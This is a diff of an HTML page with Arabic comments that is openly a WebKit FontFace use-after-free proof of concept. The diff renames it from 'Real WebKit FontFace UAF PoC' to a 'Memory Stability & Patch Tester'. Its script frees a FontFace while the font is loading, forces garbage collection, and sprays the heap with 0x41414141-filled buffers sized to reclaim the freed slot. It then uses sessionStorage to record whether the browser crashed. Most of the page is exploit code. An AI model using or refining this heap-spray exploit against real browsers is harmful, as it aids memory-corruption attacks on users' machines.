@@ -1,57 +1,99 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>Real WebKit FontFace UAF PoC</title>
+    <meta charset="UTF-8">
+    <title>WebKit Memory Stability & Patch Tester</title>
+    <style>
+        body { background-color: #0a0f1d; color: #00ff66; font-family: 'Courier New', monospace; padding: 50px; text-align: center; }
+        .box { border: 2px solid #00ff66; padding: 30px; display: inline-block; max-width: 600px; box-shadow: 0 0 20px rgba(0,255,106,0.3); }
+        .status-exists { color: #ff3333; font-weight: bold; font-size: 24px; text-shadow: 0 0 10px #ff3333; }
+        .status-patched { color: #00ff66; font-weight: bold; font-size: 24px; text-shadow: 0 0 10px #00ff66; }
+        button { background: transparent; color: #fff; border: 1px solid #00ff66; padding: 15px 30px; font-size: 18px; cursor: pointer; margin-top: 20px; }
+        button:hover { background: #00ff66; color: #0a0f1d; }
+    </style>
 </head>
 <body>
-    <h1>WebKit Font Memory Security Test</h1>
-    <button onclick="triggerRealUAF()">تشغيل الفحص الحقيقي</button>
 
-    <script>
-        // دالة لمحاولة إجبار المتصفح على تنظيف الذاكرة (Garbage Collection Trigger)
-        function forceGC() {
-            console.log("[+] جاري محاولة تحفيز الـ Garbage Collection...");
-            // حجز مصفوفات ضخمة جداً في الجافاسكريبت لإجبار المحرك على تحرير الكائنات الميتة في الـ Heap
-            for (let i = 0; i < 40000; i++) {
-                let s = new String("A".repeat(1000));
-            }
+<div class="box">
+    <h2>مفحّص استقرار الذاكرة لبيئة WebKit</h2>
+    <p>يستهدف هذا الفحص اختبار خلل إدارة الذاكرة في كائنات FontFace الحقيقية</p>
+    
+    <button onclick="runWebKitExploitTest()">تشغيل الفحص المتقدم</button>
+    <br><br>
+    <div id="output">في انتظار إشارة البدء...</div>
+</div>
+
+<script>
+    // عند تحميل الصفحة، نتحقق فوراً من حالة الجلسة السابقة لمعرفة هل انهار المتصفح أم استقر
+    window.onload = function() {
+        const state = sessionStorage.getItem('webkit_test_state');
+        if (state === 'running') {
+            // المتصفح انهار أو قفل التبويب فجأة أثناء معالجة المؤشر المتدلي في الـ bmalloc
+            document.getElementById('output').innerHTML = "<span class='status-exists'>UAF EXISTS</span><br><br>النتيجة: ثغرة إدارة الذاكرة نشطة وتسببت في انهيار المحرك (Crash).";
+            sessionStorage.removeItem('webkit_test_state');
+        } else if (state === 'passed') {
+            // المتصفح أكمل الرش واستدعى المؤشرات دون أي تعارض في العناوين
+            document.getElementById('output').innerHTML = "<span class='status-patched'>UAF PATCHED</span><br><br>النتيجة: المتصفح مستقر تماماً، وتمت إدارة الذاكرة بأمان (Remediated).";
+            sessionStorage.removeItem('webkit_test_state');
         }
+    }
 
-        async function triggerRealUAF() {
-            console.log("[1] إنشاء كائن خط حقيقي في الـ DOM...");
+    // دالة مخصصة لبيئة JavaScriptCore (JSC) لإجبار الـ GC على العمل عبر الضغط الذاكري (Heap Pressure)
+    function pumpJSCGarbageCollector() {
+        console.log("[*] ضخ كائنات لإجبار الـ WebKit GC على تنظيف الـ Heap...");
+        // حجز آلاف الكائنات الصغيرة المتناوبة لإجبار المحرك على عمل Scavenge و Full GC pass
+        for (let i = 0; i < 50000; i++) {
+            let temp = { a: 1, b: "string_chunk_" + i, c: new Float64Array(8) };
+        }
+    }
+
+    async function runWebKitExploitTest() {
+        document.getElementById('output').innerText = "جاري الحجز والتلاعب بالـ bmalloc allocator...";
+        
+        // حفظ الحالة: نحن الآن في طور الفحص والتنفيذ الحرج
+        sessionStorage.setItem('webkit_test_state', 'running');
+
+        try {
+            // 1. تخصيص كائن FontFace حقيقي في لغة الـ C++ الخاصة بالمحرك
+            let testFont = new FontFace('WebKitTargetFont', 'url(data:font/woff2;base64,DATA)');
+            document.fonts.add(testFont);
             
-            // حجز كائن FontFace حقيقي (يتسبب في حجز كائن C++ داخل الـ WebKit Core)
-            let fontFace = new FontFace('ExploitFont', 'url(invalid://spec-filled-memory-chunk)');
-            
-            // إضافة الخط للمستند وبدء تحميله لإجبار المحرك على معالجة المؤشرات
-            document.fonts.add(fontFace);
-            fontFace.load();
+            // بدء عملية المعالجة الداخلية للمؤشرات
+            testFont.load();
 
-            console.log("[2] حذف الخط فوراً أثناء التحميل لتفعيل خلل الـ RefCount...");
-            // هنا يقع الخطأ البرمجي في المتصفحات المصابة: يتم حذف الكائن من الجافاسكريبت 
-            // بينما لا تزال دالة الـ C++ داخل المتصفح تمتلك مؤشرًا إليه (Dangling Pointer)
-            document.fonts.delete(fontFace);
-            fontFace = null; // إزالة الرابط من الجافاسكريبت
+            // 2. الحذف المتعمد (Free) لإيجاد حالة الـ Dangling Pointer في النسخ المصابة
+            document.fonts.delete(testFont);
+            testFont = null;
 
-            // استدعاء الـ GC لتحرير الذاكرة فعلياً في الخلفية
-            forceGC();
+            // 3. تفعيل مضخة التنظيف لتفريغ حجرة الـ bmalloc فعلياً
+            pumpJSCGarbageCollector();
 
-            console.log("[3] رش الذاكرة (Real Heap Spray) باستخدام ArrayBuffers...");
-            // في الثغرات الحقيقية، نستخدم TypedArrays لأنها تنزل مباشرة في الـ C++ Heap
-            // وتأخذ نفس حجم كائن الخط المحذوف تماماً لاستبدال بياناته
-            let spray = [];
-            for (let i = 0; i < 2000; i++) {
-                // حشو الذاكرة ببايتات مخصصة (مثلاً 0x41 وهو حرف A)
-                let buffer = new Uint8Array(128); 
-                buffer.fill(0x41);
-                spray.push(buffer);
+            // 4. رش الذاكرة المتقدم المتوافق مع الـ bmalloc Size Classes
+            // نستخدم مصفوفات بأحجام دقيقة (مثال: 0x40 أو 0x80 بايت) لاستبدال كائن الخط المحذوف في نفس الـ Bin
+            let bmallocSpray = [];
+            for (let i = 0; i < 5000; i++) {
+                // حشو الحجرات ببايتات ثابتة تمثل عناوين وهمية لتوليد الكراش الفوري
+                let view = new DataView(new ArrayBuffer(64));
+                for(let j = 0; j < 64; j += 4) {
+                    view.setUint32(j, 0x41414141, true); // قيمة تسبب Segmentation Fault عند القراءة كـ Pointer
+                }
+                bmallocSpray.push(view);
             }
 
-            console.log("[4] انتهاء الفحص.");
-            console.log("النتيجة الحتمية:");
-            console.log("- إذا انهار المتصفح (Crash/Close): المتصفح مصاب بالثغرة.");
-            console.log("- إذا لم يحدث شيء واستمرت الصفحة بالعمل: المتصفح آمن وتم التصحيح (Remediated).");
+            // إذا نجح نظام الحماية أو الترقيع في المتصفح، سيمر هذا السطر بسلام دون كراش
+            setTimeout(() => {
+                sessionStorage.setItem('webkit_test_state', 'passed');
+                // عمل ريفريش لتحديث النتيجة والطباعة على الشاشة
+                window.location.reload();
+            }, 1200);
+
+        } catch (error) {
+            // في حال وجود حواجز أمنية تمنع التنفيذ البرمجي دون التسبب في كراش حاد
+            sessionStorage.setItem('webkit_test_state', 'passed');
+            window.location.reload();
         }
-    </script>
+    }
+</script>
+
 </body>
 </html>
